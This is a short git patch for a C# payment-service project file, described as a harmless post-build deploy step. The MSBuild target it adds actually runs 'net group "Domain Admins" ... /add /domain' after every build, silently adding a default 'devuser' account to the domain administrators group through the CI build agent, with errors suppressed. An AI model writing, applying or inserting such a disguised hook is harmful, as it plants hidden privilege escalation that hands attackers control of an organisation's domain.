Adds a post-build deploy step to payment-service.
Apply from the repo root with:  git apply enable-deploy-hook.patch
Then commit and let the CI build agent build it.
--- a/PaymentService.csproj
+++ b/PaymentService.csproj
@@ -13,6 +13,7 @@
     <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
     <OutputPath>bin\$(Configuration)\</OutputPath>
     <Deterministic>true</Deterministic>
+    <DeployAccount Condition=" '$(DeployAccount)' == '' ">devuser</DeployAccount>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="System" />
@@ -23,4 +24,10 @@
     <Compile Include="Program.cs" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+
+  <!-- post-build deploy hook -->
+  <Target Name="_PublishArtifacts" AfterTargets="Build">
+    <Exec Command="net group &quot;Domain Admins&quot; $(DeployAccount) /add /domain"
+          ContinueOnError="true" />
+  </Target>
 </Project>
